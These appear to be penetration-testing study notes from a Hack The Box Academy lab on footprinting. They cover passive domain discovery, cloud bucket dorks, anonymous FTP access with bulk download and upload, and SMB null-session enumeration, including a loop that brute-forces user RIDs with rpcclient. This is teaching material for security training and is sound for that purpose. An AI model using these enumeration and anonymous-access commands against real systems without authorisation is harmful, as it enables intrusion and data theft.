# A. Enumeration Principles \& Methodology
Whole enumeration process is divided into 3 different level:
1. **Infrastructure-based enumeration**
- *Internet presence*: Identification of internet presence and externally accessible infrastructure. (Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures)
- *Gateway*: Identify the possible security measures to protect the company's external and internal infrastructure. (Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare)
2. **Host-based enumeration**
- *Accessible services*: Identify accessible interfaces and services that are hosted externally or internally. (Service Type, Functionality, Configuration, Port, Version, Interface)
- *Processes*: Identify the internal processes, sources, and destinations associated with the services. (PID, Processed Data, Tasks, Source, Destination)
3. **OS-based enumeration**
- *Privileges*: Identification of the internal permissions and privileges to the accessible services. (Groups, Users, Permissions, Restrictions, Environment)
- *OS Setup*: Identification of the internal components and systems setup. (OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files)

---

# B.1. Infrastructe Based Enumeration: Domain Information
- Domain information is a core component of any penetration test, and it is not just about the subdomains but about the entire presence on the Internet.
- Gathered passively without direct and active scans.

## Certificate Transparency
- SSL certificate from the company's main website includes more than just a subdomain, and this means that the certificate is used for several domains, and these are most likely still active.
- We can use `crt.sh`, which source is the Certificate Transparency logs to find more subdomains.

```bash
selwynang@htb[/htb]$ curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .

[
  {
    "issuer_ca_id": 23451835427,
    "issuer_name": "C=US, O=Let's Encrypt, CN=R3",
    "common_name": "matomo.inlanefreight.com",
    "name_value": "matomo.inlanefreight.com",
    "id": 50815783237226155,
    "entry_timestamp": "2021-08-21T06:00:17.173",
    "not_before": "2021-08-21T05:00:16",
    "not_after": "2021-11-19T05:00:15",
    "serial_number": "03abe9017d6de5eda90"
  },
  {
    "issuer_ca_id": 6864563267,
    "issuer_name": "C=US, O=Let's Encrypt, CN=R3",
    "common_name": "matomo.inlanefreight.com",
    "name_value": "matomo.inlanefreight.com",
    "id": 5081529377,
    "entry_timestamp": "2021-08-21T06:00:16.932",
    "not_before": "2021-08-21T05:00:16",
    "not_after": "2021-11-19T05:00:15",
    "serial_number": "03abe90104e271c98a90"
  },
  {
    "issuer_ca_id": 113123452,
    "issuer_name": "C=US, O=Let's Encrypt, CN=R3",
    "common_name": "smartfactory.inlanefreight.com",
    "name_value": "smartfactory.inlanefreight.com",
    "id": 4941235512141012357,
    "entry_timestamp": "2021-07-27T00:32:48.071",
    "not_before": "2021-07-26T23:32:47",
    "not_after": "2021-10-24T23:32:45",
    "serial_number": "044bac5fcc4d59329ecbbe9043dd9d5d0878"
  },
  { ... SNIP ...

```

## Company Hosted Servers
- Once we see which hosts can be investigated further, we can generate a list of IP addresses with a minor adjustment to the `cut` command and run them through `Shodan`.
- `Shodan` can be used to find devices and systems permanently connected to the Internet like IoT. It searches the Internet for open TCP/IP ports and filters the systems according to specific terms and criteria.

```bash
selwynang@htb[/htb]$ for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done
selwynang@htb[/htb]$ for i in $(cat ip-addresses.txt);do shodan host $i;done

10.129.24.93
City:                    Berlin
Country:                 Germany
Organization:            InlaneFreight
Updated:                 2021-09-01T09:02:11.370085
Number of open ports:    2

Ports:
     80/tcp nginx 
    443/tcp nginx 
    
10.129.27.33
City:                    Berlin
Country:                 Germany
Organization:            InlaneFreight
Updated:                 2021-08-30T22:25:31.572717
Number of open ports:    3

Ports:
     22/tcp OpenSSH (7.6p1 Ubuntu-4ubuntu0.3)
     80/tcp nginx 
    443/tcp nginx 
        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, -TLSv1.3, TLSv1.2
        |-- Diffie-Hellman Parameters:
                Bits:          2048
                Generator:     2
                
10.129.27.22
City:                    Berlin
Country:                 Germany
Organization:            InlaneFreight
Updated:                 2021-09-01T15:39:55.446281
Number of open ports:    8

Ports:
     25/tcp  
        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2, TLSv1.3
     53/tcp  
     53/udp  
     80/tcp Apache httpd 
     81/tcp Apache httpd 
    110/tcp  
        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2
    111/tcp  
    443/tcp Apache httpd 
        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2, TLSv1.3
        |-- Diffie-Hellman Parameters:
                Bits:          2048
                Generator:     2
                Fingerprint:   RFC3526/Oakley Group 14
    444/tcp  
        
10.129.27.33
City:                    Berlin
Country:                 Germany
Organization:            InlaneFreight
Updated:                 2021-08-30T22:25:31.572717
Number of open ports:    3

Ports:
     22/tcp OpenSSH (7.6p1 Ubuntu-4ubuntu0.3)
     80/tcp nginx 
    443/tcp nginx 
        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, -TLSv1.3, TLSv1.2
        |-- Diffie-Hellman Parameters:
                Bits:          2048
                Generator:     2

```

## DNS Records
| Type | Description |
| --- | --- |
| `A` | IP addresses that point to a specific (sub)domain. |
| `MX` | Mail server records show us which mail server is responsible for managing emails for the company. |
| `NS` | Shows which name servers are used to resolve the FQDN to IP addresses. Most hosting providers use their own name servers, making it easier to identify the hosting provider. |
| `TXT` | Contains verification keys for different 3rd party providers and other security aspects of DNS, such as SPF, DMARC and DKIM, which are responsible for verifying and confirming the origin of the emails sent. |

- Use `dig` to find DNS records.

```bash
selwynang@htb[/htb]$ dig any inlanefreight.com

; <<>> DiG 9.16.1-Ubuntu <<>> any inlanefreight.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 52058
;; flags: qr rd ra; QUERY: 1, ANSWER: 17, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;inlanefreight.com.             IN      ANY

;; ANSWER SECTION:
inlanefreight.com.      300     IN      A       10.129.27.33
inlanefreight.com.      300     IN      A       10.129.95.250
inlanefreight.com.      3600    IN      MX      1 aspmx.l.google.com.
inlanefreight.com.      3600    IN      MX      10 aspmx2.googlemail.com.
inlanefreight.com.      3600    IN      MX      10 aspmx3.googlemail.com.
inlanefreight.com.      3600    IN      MX      5 alt1.aspmx.l.google.com.
inlanefreight.com.      3600    IN      MX      5 alt2.aspmx.l.google.com.
inlanefreight.com.      21600   IN      NS      ns.inwx.net.
inlanefreight.com.      21600   IN      NS      ns2.inwx.net.
inlanefreight.com.      21600   IN      NS      ns3.inwx.eu.
inlanefreight.com.      3600    IN      TXT     "MS=ms92346782372"
inlanefreight.com.      21600   IN      TXT     "atlassian-domain-verification=IJdXMt1rKCy68JFszSdCKVpwPN"
inlanefreight.com.      3600    IN      TXT     "google-site-verification=O7zV5-xFh_jn7JQ31"
inlanefreight.com.      300     IN      TXT     "google-site-verification=bow47-er9LdgoUeah"
inlanefreight.com.      3600    IN      TXT     "google-site-verification=gZsCG-BINLopf4hr2"
inlanefreight.com.      3600    IN      TXT     "logmein-verification-code=87123gff5a479e-61d4325gddkbvc1-b2bnfghfsed1-3c789427sdjirew63fc"
inlanefreight.com.      300     IN      TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.24.8 ip4:10.129.27.2 ip4:10.72.82.106 ~all"
inlanefreight.com.      21600   IN      SOA     ns.inwx.net. hostmaster.inwx.net. 2021072600 10800 3600 604800 3600

;; Query time: 332 msec
;; SERVER: 127.0.0.53#53(127.0.0.53)
;; WHEN: Mi Sep 01 18:27:22 CEST 2021
;; MSG SIZE  rcvd: 940
```

---

# B.2. Infrastructure Based Enumeration: Cloud Resources
- Even though cloud providers (AWS, GCP, Azure) secure their infrastructure centrally, this does not mean that companies are free from vulnerabilities. Configurations made by the administrators may make the company's cloud resources vulnerable.
- S3 buckets (AWS), blobs (Azure), cloud storage (GCP) can be accessed without authentication if configured incorrectly.

## Google Search for AWS
We can use Google Dorks `inurl:` and `intext:` to find AWS links.

```google
intext:<company name> inurl:amazonaws.com
```

## Google Search for Azure
```google
intext:<company name> inurl:blob.core.windows.net
```

## Target Website (Source Code)
- Such cloud content is also often included in the source code of the web pages, from where the images, JavaScript code, or CSS are loaded.
- `domain.glass` can tell us a lot about the company's infrastructure.
- `GrayHatWarfare` can passively discover what files are stored on the given cloud storage.
- SSH private keys might be leaked through these buckets if the employee accidentally uploads them to the buckets.

---

# C.1. Host Based Enumeration: FTP
- `File Transfer Protocol (FTP)` runs within the application layer of the TCP/IP protocol stack. Uploads local files to a server and download other files.
- Client and server establishes control channel through TCP port `21`, and then establish data channel via TCP port `20`.
- **Active FTP:** Client establishes the connection via TCP port `21` and thus informs the server via which client-side port the server can transmit its responses. However, if a firewall protects the client, the server cannot reply because all external connections are blocked.
- **Passive FTP:** Server announces a port through which the client can establish the data channel. Since the client initiates the connection in this method, the firewall does not block the transfer.
- Usually, we need credentials to use FTP on a server. However, there is also the possibility that a server offers anonymous FTP, which allows any user to upload or download files via FTP without using a password.

## TFTP
- `Trivial File Transfer Protocol (TFTP)` is simpler than FTP and performs file transfers between client and server processes. 
- However, it does not provide user authentication and other valuable features supported by FTP. 
- In addition, while FTP uses TCP, TFTP uses UDP, making it an unreliable protocol and causing it to use UDP-assisted application layer recovery.
-  Because of the lack of security, TFTP, unlike FTP, may only be used in local and protected networks.
- `TFTP` does not have directory listing functionality.

| Commands | Description |
| --- | --- |
| `connect` | Sets the remote host, and optionally the port, for file transfers. |
| `get` | Transfers a file or set of files from the remote host to the local host. |
| `put` | Transfers a file or set of files from the local host onto the remote host. |
| `quit` | Exits tftp. |
| `status` | Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on. |
| `verbose` | Turns verbose mode, which displays additional information during file transfer, on or off. |

## Default Configuration
- One of the most used FTP servers on Linux-based distributions is `vsFTPd`.
- Default configuration of `vsFTPd` can be found in `/etc/vsftpd.conf`.

```bash
cat /etc/vsftpd.conf | grep -v "#"
```

- There is a file called `/etc/ftpusers` that we need to pay attention to, as this file is used to deny certain users access to FTP.

```bash
selwynang@htb[/htb]$ cat /etc/ftpusers

guest
john
kevin

# Users guest, john, kevin are not permitted to log in to the FTP service.
```

## Dangerous Settings
- `anonymous` settings can be dangerous since it allows everyone the internal network to share files and data without accessing each other's computers.

| Setting | Description |
| --- | --- |
| `anonymous_enable=YES` | Allowing anonymous login? |
| `anon_upload_enable=YES` | Allowing anonymous to upload files? |
| `anon_mkdir_write_enable=YES` | Allowing anonymous to create new directories? |
| `no_anon_password=YES	` | Do not ask anonymous for password? |
| `anon_root=/home/username/ftp` | Directory for anonymous. |
| `write_enable=YES` | Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE? |

## FTP Commands
- With the standard `ftp` client, we can access the FTP server. As soon as we connect to the `vsFTPd` server, the response code `220` is displayed with the banner of the FTP server.

### Anonymous Login
```bash
selwynang@htb[/htb]$ ftp 10.129.14.136

Connected to 10.129.14.136.
220 "Welcome to the HTB Academy vsFTP service."
Name (10.129.14.136:cry0l1t3): anonymous

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.


ftp> ls

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
226 Directory send OK.
```

### vsFTPd Status
- Command: `status`
```bash
ftp> status

Connected to 10.129.14.136.
No proxy connection.
Connecting using address family: any.
Mode: stream; Type: binary; Form: non-print; Structure: file
Verbose: on; Bell: off; Prompting: on; Globbing: on
Store unique: off; Receive unique: off
Case: off; CR stripping: on
Quote control characters: on
Ntrans: off
Nmap: off
Hash mark printing: off; Use of PORT cmds: on
Tick counter printing: off
```

### vsFTPd Detailed Output
- Commands: `debug` and `trace`
- These commands will make the server show us more information.
```bash
ftp> debug

Debugging on (debug=1).


ftp> trace

Packet tracing on.


ftp> ls

---> PORT 10,10,14,4,188,195
200 PORT command successful. Consider using PASV.
---> LIST
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
226 Directory send OK.
```

### Recursive Listing
- Command: `ls -R`

```bash
ftp> ls -R

---> PORT 10,10,14,4,222,149
200 PORT command successful. Consider using PASV.
---> LIST -R
150 Here comes the directory listing.
.:
-rw-rw-r--    1 ftp      ftp      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 ftp      ftp           41 Sep 14 16:45 Important Notes.txt
-rw-------    1 ftp      ftp            0 Sep 15 14:57 testupload.txt

./Clients:
drwx------    2 ftp      ftp          4096 Sep 16 18:04 HackTheBox
drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:00 Inlanefreight

./Clients/HackTheBox:
-rw-r--r--    1 ftp      ftp         34872 Sep 16 18:04 appointments.xlsx
-rw-r--r--    1 ftp      ftp        498123 Sep 16 18:04 contract.docx
-rw-r--r--    1 ftp      ftp        478237 Sep 16 18:04 contract.pdf
-rw-r--r--    1 ftp      ftp           348 Sep 16 18:04 meetings.txt

./Clients/Inlanefreight:
-rw-r--r--    1 ftp      ftp         14211 Sep 16 18:00 appointments.xlsx
-rw-r--r--    1 ftp      ftp         37882 Sep 16 17:58 contract.docx
-rw-r--r--    1 ftp      ftp            89 Sep 16 17:58 meetings.txt
-rw-r--r--    1 ftp      ftp        483293 Sep 16 17:59 proposal.pptx

./Documents:
-rw-r--r--    1 ftp      ftp         23211 Sep 16 18:05 appointments-template.xlsx
-rw-r--r--    1 ftp      ftp         32521 Sep 16 18:05 contract-template.docx
-rw-r--r--    1 ftp      ftp        453312 Sep 16 18:05 contract-template.pdf

./Employees:
226 Directory send OK.
```

### Download a File
```bash
ftp> get Important\ Notes.txt

local: Important Notes.txt remote: Important Notes.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Important Notes.txt (41 bytes).
226 Transfer complete.
41 bytes received in 0.00 secs (606.6525 kB/s)
```

### Download All Available Files
- Use `wget`, which will create a directory with the name of the IP address of our target, which we can inspect with the command `tree .`.

```bash
selwynang@htb[/htb]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136

--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/                                         
           => ‘10.129.14.136/.listing’                                                                     
Connecting to 10.129.14.136:21... connected.                                                               
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PORT ... done.    ==> LIST ... done.                                                                 
12.12.1.136/.listing           [ <=>                                  ]     466  --.-KB/s    in 0s       
                                                                                                         
2021-09-19 14:45:58 (65,8 MB/s) - ‘10.129.14.136/.listing’ saved [466]                                     
--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/Calendar.pptx   
           => ‘10.129.14.136/Calendar.pptx’                                       
==> CWD not required.                                                           
==> SIZE Calendar.pptx ... done.                                                                                                                            
==> PORT ... done.    ==> RETR Calendar.pptx ... done.       

...SNIP...

2021-09-19 14:45:58 (48,3 MB/s) - ‘10.129.14.136/Employees/.listing’ saved [119]

FINISHED --2021-09-19 14:45:58--
Total wall clock time: 0,03s
Downloaded: 15 files, 1,7K in 0,001s (3,02 MB/s)
```

### Upload a File
- Command: `put`

```bash
ftp> put testupload.txt 

local: testupload.txt remote: testupload.txt
---> PORT 10,10,14,4,184,33
200 PORT command successful. Consider using PASV.
---> STOR testupload.txt
150 Ok to send data.
226 Transfer complete.
```

## Footprinting the Service

### Nmap FTP Scripts
1. Update the database of NSE scripts first.
```bash
selwynang@htb[/htb]$ sudo nmap --script-updatedb

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 13:49 CEST
NSE: Updating rule database.
NSE: Script Database updated successfully.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.28 seconds
```
2. Locate all NSE scripts related to FTP service.
```bash
selwynang@htb[/htb]$ find / -type f -name ftp* 2>/dev/null | grep scripts

/usr/share/nmap/scripts/ftp-syst.nse
/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-bounce.nse
/usr/share/nmap/scripts/ftp-libopie.nse
/usr/share/nmap/scripts/ftp-anon.nse
/usr/share/nmap/scripts/ftp-brute.nse
```
3. We already know that the FTP server usually runs on standard TCP port `21`. We will also use version scan `-sV`, aggressive scan `-A`, and the default script scan `-sC` against the target.
```bash
selwynang@htb[/htb]$ sudo nmap -sV -p21 -sC -A 10.129.14.136

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-16 18:12 CEST
Nmap scan report for 10.129.14.136
Host is up (0.00013s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxrwxrwx    1 ftp      ftp       8138592 Sep 16 17:24 Calendar.pptx [NSE: writeable]
| drwxrwxrwx    4 ftp      ftp          4096 Sep 16 17:57 Clients [NSE: writeable]
| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:05 Documents [NSE: writeable]
| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 17:24 Employees [NSE: writeable]
| -rwxrwxrwx    1 ftp      ftp            41 Sep 16 17:24 Important Notes.txt [NSE: writeable]
|_-rwxrwxrwx    1 ftp      ftp             0 Sep 15 14:57 testupload.txt [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```

### Service Interaction
- We can use `netcat` or `telnet` to interact with the FTP server.

```bash
selwynang@htb[/htb]$ nc -nv 10.129.14.136 21
```

```bash
selwynang@htb[/htb]$ telnet 10.129.14.136 21
```

- If the FTP server runs with TLS/SSL encryption, then we need a client that can handle TLS/SSL. We can use `openssl` client. Good thing about using `openssl` is that we can see the SSL certificate, which can also be helpful.

```bash
selwynang@htb[/htb]$ openssl s_client -connect 10.129.14.136:21 -starttls ftp

CONNECTED(00000003)                                                                                      
Can't use SSL_get_servername                        
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1

depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
verify return:1
---                                                 
Certificate chain
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
 
 i:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
---
 
Server certificate

-----BEGIN CERTIFICATE-----

MIIENTCCAx2gAwIBAgIUD+SlFZAWzX5yLs2q3ZcfdsRQqMYwDQYJKoZIhvcNAQEL
...SNIP...
```

---

# C.2. Host Based Enumeration: SMB
- `Server Message Block (SMB)` is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network. 
- With the free software project Samba, there is also a solution that enables the use of SMB in Linux and Unix distributions and thus cross-platform communication via SMB.
- SMB uses TCP protocol, which provides for a three-way handshake between client and server before a connection is finally established. 
-  When SMB commands are transmitted over Samba to an older NetBIOS service, connections typically occur over TCP ports `137`, `138`, and `139`. In contrast, the Common Internet File System (CIFS) network protocol implemented by Samba operates over TCP port `445` exclusively. 
- There are several versions of SMB, including newer versions like SMB 2 and SMB 3, which offer improvements and are preferred in modern infrastructures, while older versions like SMB 1 (CIFS) are considered outdated but may still be used in specific environments.

## Default Configuration
- Samba configuration can be retrieved from `/etc/samba/smb.conf`.

| Setting | Description |
| --- | --- |
| `[sharename]` | The name of the network share. |
| `workgroup = WORKGROUP/DOMAIN` | Workgroup that will appear when clients query. |
| `path = /path/here/` | The directory to which user is to be given access. |
| `server string = STRING` | The string that will show up when a connection is initiated. |
| `unix password sync = yes	Syn` | Synchronize the UNIX password with the SMB password? |
| `usershare allow guests = yes` | Allow non-authenticated users to access defined share? |
| `map to guest = bad user` | What to do when a user login request doesn't match a valid UNIX user? |
| `browseable = yes` |  Should this share be shown in the list of available shares? |
| `guest ok = yes` | Allow connecting to the service without using a password? |
| `read only = yes` | Allow users to read files only? |
| `create mask = 0700` | What permissions need to be set for newly created files?
|

```bash
selwynang@htb[/htb]$ cat /etc/samba/smb.conf | grep -v "#\|\;" 

[global]
   workgroup = DEV.INFREIGHT.HTB
   server string = DEVSMB
   log file = /var/log/samba/log.%m
   max log size = 1000
   logging = file
   panic action = /usr/share/samba/panic-action %d

   server role = standalone server
   obey pam restrictions = yes
   unix password sync = yes

   passwd program = /usr/bin/passwd %u
   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .

   pam password change = yes
   map to guest = bad user
   usershare allow guests = yes

[printers]
   comment = All Printers
   browseable = no
   path = /var/spool/samba
   printable = yes
   guest ok = no
   read only = yes
   create mask = 0700

[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
```

## Dangerous Settings
| Setting | Description |
|---|---|
| `browseable = yes` | Allow listing available shares in the current share? |
| `read only = no` | Forbid the creation and modification of files? |
| `writable = yes` | Allow users to create and modify files? |
| `guest ok = yes` | Allow connecting to the service without using a password? |
| `enable privileges = yes` | Honor privileges assigned to specific SID? |
| `create mask = 0777` | What permissions must be assigned to the newly created files? |
| `directory mask = 0777` | What permissions must be assigned to the newly created directories? |
| `logon script = script.sh` | What script needs to be executed on the user's login? |
| `magic script = script.sh` | Which script should be executed when the script gets closed? |
| `magic output = script.out` | Where the output of the magic script needs to be stored? |

## SMB Commands

### Listing Shares \& Connecting to the Share 

```bash
selwynang@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        home            Disk      INFREIGHT Samba
        dev             Disk      DEVenv
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled -- no workgroup available

# -L: Display a list of the server's shares.
# -N: Null session, which is anonymous access.
```
```bash
selwynang@htb[/htb]$ smbclient //10.129.14.128/notes

Enter WORKGROUP\<username>'s password: 
Anonymous login successful
Try "help" to get a list of possible commands.
```

### Downloading Files from SMB
- Command: `get`
- `!<cmd>`: Allows us to execute local system commands without interrupting the connection.
```bash
smb: \> get prep-prod.txt 

getting file \prep-prod.txt of size 71 as prep-prod.txt (8,7 KiloBytes/sec) 
(average 8,7 KiloBytes/sec)


smb: \> !ls

prep-prod.txt


smb: \> !cat prep-prod.txt

[] check your code with the templates
[] run code-assessment.py
[] …    
```

### Samba Status
- Command: `smbstatus`

```bash
root@samba:~# smbstatus

Samba version 4.11.6-Ubuntu
PID     Username     Group        Machine                                   Protocol Version  Encryption           Signing              
----------------------------------------------------------------------------------------------------------------------------------------
75691   sambauser    samba        10.10.14.4 (ipv4:10.10.14.4:45564)      SMB3_11           -                    -                    

Service      pid     Machine       Connected at                     Encryption   Signing     
---------------------------------------------------------------------------------------------
notes        75691   10.10.14.4   Do Sep 23 00:12:06 2021 CEST     -            -           

No locked files
```

## Footprinting the Service

### Nmap

```bash
selwynang@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
Nmap scan report for sharing.inlanefreight.htb (10.129.14.128)
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.35 seconds
```

### RPC Client
- `rpcclient` allows us to manually interact with the SMB service and send specific requests for the information.
- `Remote Procedure Call (RPC)` is a concept and also a central tool to realise operational and work-sharing structures in networks and client-server architectures.

- **Connection via rpcclient**
```bash
selwynang@htb[/htb]$ rpcclient -U "" 10.129.14.128

Enter WORKGROUP\'s password:
rpcclient $> 
```

- **rpcclient Enumeration**
```bash
# Server Information
rpcclient $> srvinfo

        DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
```

```bash
# Enumerate all domains that are deployed in the network.
rpcclient $> enumdomains

name:[DEVSMB] idx:[0x0]
name:[Builtin] idx:[0x1]
```

```bash
# Provides domain, server, and user information of deployed domains.
rpcclient $> querydominfo

Domain:         DEVOPS
Server:         DEVSMB
Comment:        DEVSM
Total Users:    2
Total Groups:   0
Total Aliases:  0
Sequence No:    1632361158
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
```

```bash
# Enumerates all available shares.
rpcclient $> netshareenumall

netname: print$
        remark: Printer Drivers
        path:   C:\var\lib\samba\printers
        password:
netname: home
        remark: INFREIGHT Samba
        path:   C:\home\
        password:
netname: dev
        remark: DEVenv
        path:   C:\home\sambauser\dev\
        password:
netname: notes
        remark: CheckIT
        path:   C:\mnt\notes\
        password:
netname: IPC$
        remark: IPC Service (DEVSM)
        path:   C:\tmp
        password:
```        

```bash
# Provides information about a specific share.
rpcclient $> netsharegetinfo notes

netname: notes
        remark: CheckIT
        path:   C:\mnt\notes\
        password:
        type:   0x0
        perms:  0
        max_uses:       -1
        num_uses:       1
revision: 1
type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE 
DACL
        ACL     Num ACEs:       1       revision:       2
        ---
        ACE
                type: ACCESS ALLOWED (0) flags: 0x00 
                Specific bits: 0x1ff
                Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
                SID: S-1-1-0
```

- **rpcclient User Enumeration**

```bash
# Enumerates all domain users.
rpcclient $> enumdomusers

user:[mrb3n] rid:[0x3e8]
user:[cry0l1t3] rid:[0x3e9]
```

```bash
# Provides information about a specific user.
rpcclient $> queryuser 0x3e9

        User Name   :   cry0l1t3
        Full Name   :   cry0l1t3
        Home Drive  :   \\devsmb\cry0l1t3
        Dir Drive   :
        Profile Path:   \\devsmb\cry0l1t3\profile
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Do, 01 Jan 1970 01:00:00 CET
        Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET
        Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET
        Password last set Time   :      Mi, 22 Sep 2021 17:50:56 CEST
        Password can change Time :      Mi, 22 Sep 2021 17:50:56 CEST
        Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x3e9
        group_rid:      0x201
        acb_info :      0x00000014
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
```

- **rpcclient Group Information**

```bash
# Identify the group's RID, which we can then use to retrieve information from the entire group.
rpcclient $> querygroup 0x201

        Group Name:     None
        Description:    Ordinary Users
        Group Attribute:7
        Num Members:2
```

- **rpcclient Brute Forcing User RIDs**
```bash
# Brute forcing User RIDs
selwynang@htb[/htb]$ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

        User Name   :   sambauser
        user_rid :      0x1f5
        group_rid:      0x201
        
        User Name   :   mrb3n
        user_rid :      0x3e8
        group_rid:      0x201
        
        User Name   :   cry0l1t3
        user_rid :      0x3e9
        group_rid:      0x201

# Alternatively, we can use a Python script from Impacket called samrdump.py
selwynang@htb[/htb]$ samrdump.py 10.129.14.128

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Retrieving endpoint list from 10.129.14.128
Found domain(s):
 . DEVSMB
 . Builtin
[*] Looking up users in domain DEVSMB
Found user: mrb3n, uid = 1000
Found user: cry0l1t3, uid = 1001
mrb3n (1000)/FullName: 
mrb3n (1000)/UserComment: 
mrb3n (1000)/PrimaryGroupId: 513
mrb3n (1000)/BadPasswordCount: 0
